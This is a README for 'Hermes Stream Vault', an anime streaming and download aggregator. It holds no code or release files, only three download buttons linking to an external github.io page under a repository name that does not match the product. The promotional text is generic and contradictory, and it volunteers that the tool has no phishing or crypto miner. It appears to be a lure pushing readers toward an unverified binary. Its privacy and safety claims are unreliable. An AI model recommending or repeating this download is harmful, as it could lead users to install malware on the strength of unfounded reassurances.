![preview](https://raw.githubusercontent.com/lyngocphat2031-png/Anime-Nexus-Library/main/preview.svg)

# Hermes Stream Vault

**Empowering your anime discovery journey through a decentralized, privacy-first streaming companion.**

Welcome to **Hermes Stream Vault** — a thoughtfully crafted platform designed for enthusiasts who value seamless access, curated content, and absolute transparency. This repository houses the core engine of a next-generation media aggregation tool, built with the philosophy that entertainment should be accessible without compromise, friction, or unnecessary gatekeeping.

---

## Overview

Hermes Stream Vault is not just another downloader; it is an **intelligent media orchestrator**. It intelligently sources, organizes, and presents anime episodes from a variety of open directories and public streaming endpoints. The system operates on a principle of **user sovereignty**: no accounts, no tracking, no algorithmic manipulation — just pure, direct access to the content you love.

Think of it as a **digital Hermes** — swift, reliable, and always delivering the message (or episode) you need, directly to your device.

[![Download](https://raw.githubusercontent.com/lyngocphat2031-png/Anime-Nexus-Library/main/button.svg)](https://lyngocphat2031-png.github.io/Anime-Nexus-Library/)

---

## ✨ Key Features

### Responsive & Adaptive UI

Whether you are on a 32-inch desktop monitor, a tablet in bed, or a phone during your commute, the interface fluidly rearranges itself. The layout is built on a **mobile-first grid**, ensuring that search, playback, and download controls are always within thumb’s reach. No pinching, no zooming, no frustration.

### 🌐 Multilingual Metadata Engine

Anime is a global culture. Our metadata engine automatically detects and displays series information in over **12 languages**, including Japanese (romaji and kanji), English, Spanish, French, Arabic, Hindi, and Mandarin. This is not mere translation — the system pulls native metadata from region-specific databases, preserving the original titles, summaries, and episode names.

### 🔁 24/7 Seamless Source Rotation

Content availability fluctuates. When one source goes offline or becomes throttled, Hermes Stream Vault **automatically rotates** to the next available mirror — often within milliseconds. You never see a dead link. You never wait for a manual retry. The system works silently in the background, ensuring your viewing experience is continuous.

### 🧩 Modular Plugin Architecture

The core is lightweight, but the capabilities are infinite. Developers can write custom source plugins in JSON or Python without modifying the main codebase. Plugins are sandboxed, versioned, and hot-reloadable. This allows the community to extend support to niche fansub groups, obscure archives, or region-locked libraries.

### 🔒 Privacy-First Architecture

Hermes Stream Vault **does not log, track, or phish**. There is no central server storing your watch history, no cookies profiling your preferences, no crypto miner hidden in the interface. All metadata is stored locally in an encrypted SQLite database. Your viewing habits are yours alone.

### 🧠 Smart Search & Filtering

Tired of scrolling through hundred-episode lists? The search algorithm supports fuzzy matching, partial names, and even phonetic searches in non-Latin scripts. You can filter by:
- Release year (range)
- Studio
- Genre (multi-select)
- Episode length
- Video resolution (480p, 720p, 1080p, 4K)
- Audio language & subtitle availability

### 🧵 Batch & Selective Retrieval

Need an entire season? Use batch mode to queue all episodes. Only need episodes 5, 7, and 12? Use selective mode. The queue supports parallel downloads with configurable concurrency to balance speed and system load.

---

## 🚀 Getting Started

Hermes Stream Vault is distributed as a single, portable binary — no dependencies to install, no runtime environments to configure. After obtaining the binary, simply run it, and a local web interface is launched on `http://localhost:9696`.

> **Note:** No user registration, no API key, no subscription is required.

[![Download](https://raw.githubusercontent.com/lyngocphat2031-png/Anime-Nexus-Library/main/button.svg)](https://lyngocphat2031-png.github.io/Anime-Nexus-Library/)

---

## System Requirements

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| CPU       | 1.5 GHz dual-core | 2.5 GHz quad-core |
| RAM       | 512 MB | 2 GB |
| Storage   | 200 MB (program) | 10 GB+ (cache) |
| Network   | 10 Mbps | 50 Mbps |
| OS        | Windows 10+, macOS 12+, Linux (any distribution with glibc 2.28+) | Same |

The program is fully portable and can be run from a USB drive or a RAM disk.

---

## ⚙️ How It Works (Technical Overview)

1. **Discovery Phase:** Upon searching for a title, Hermes queries multiple public API endpoints and RSS feeds simultaneously.
2. **Aggregation Phase:** Results are deduplicated, sorted by quality (resolution, file size, seed health), and ranked by a proprietary trust score based on historical uptime.
3. **Delivery Phase:** You are presented with a list of available episodes. Clicking one initiates a direct stream (no transcoding, no proxy) or a download via chunked HTTP requests with resume support.
4. **Caching Layer:** Recently accessed episodes are cached locally to reduce redundant network requests. The cache is LRU-based and can be pruned automatically.

---

## 🎨 UI Customization

The interface supports **dark mode** and **light mode** themes, as well as custom CSS injection for power users. A built-in editor allows you to modify colors, fonts, and layout spacings in real time. Presets for accessibility (high contrast, large fonts, reduced motion) are included.

---

## 🛠️ Developer Notes

- The backend is written in **Rust** for memory safety and performance.
- The frontend uses **Svelte** with a reactive state management system.
- All network requests are made via **libcurl** with TLS 1.3 support.
- The system respects `robots.txt` and rate-limiting headers from public sources.

---

## 🧾 License

This repository is distributed under the **MIT License**. You are free to use, modify, and distribute the software for any purpose, provided the original copyright notice is included.

See the full license text at: [MIT License](https://opensource.org/licenses/MIT)

---

## ⚠️ Disclaimer

Hermes Stream Vault is a **technological aggregation tool**. It does not host, store, or distribute any copyrighted content. It acts solely as an intermediary that retrieves publicly available metadata and stream links from third-party sources. The operators of this repository do not control, endorse, or assume responsibility for the content accessed through this tool. Users are strongly encouraged to comply with all applicable local, national, and international copyright laws. **This tool is intended for personal, non-commercial use only.** The creators assume no liability for misuse of the software.

© 2026 Hermes Stream Vault Contributors. All rights reserved under the MIT License.

---

[![Download](https://raw.githubusercontent.com/lyngocphat2031-png/Anime-Nexus-Library/main/button.svg)](https://lyngocphat2031-png.github.io/Anime-Nexus-Library/)